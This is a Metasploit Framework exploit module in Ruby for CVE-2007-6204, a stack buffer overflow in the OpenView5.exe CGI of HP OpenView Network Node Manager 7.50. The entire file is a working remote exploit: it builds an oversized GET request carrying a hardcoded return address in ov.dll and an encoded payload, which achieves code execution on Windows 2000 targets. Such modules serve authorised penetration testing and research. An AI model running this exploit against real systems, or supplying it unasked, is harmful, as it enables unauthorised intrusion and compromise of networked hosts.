##
# $Id: hp_nnm_openview5.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP OpenView Network Node Manager OpenView5.exe CGI Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.50.
				By sending a specially crafted CGI request, an attacker may be able to execute
				arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2007-6204' ],
					[ 'OSVDB', '39530' ],
					[ 'BID', '26741' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 650,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'HP OpenView Network Node Manager 7.50 / Windows 2000 All', { 'Ret' => 0x5a01d78d } ], # ov.dll
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Dec 6 2007'))

		register_options( [ Opt::RPORT(80) ], self.class )
	end

	def exploit
		connect

		sploit =  "GET /OvCgi/OpenView5.exe?Context=Snmp&Action=" + rand_text_alpha_upper(5123)
		sploit << [target.ret].pack('V') + payload.encoded

		print_status("Trying target %s..." % target.name)
		sock.put(sploit + "\r\n\r\n")

		handler
		disconnect
	end

end
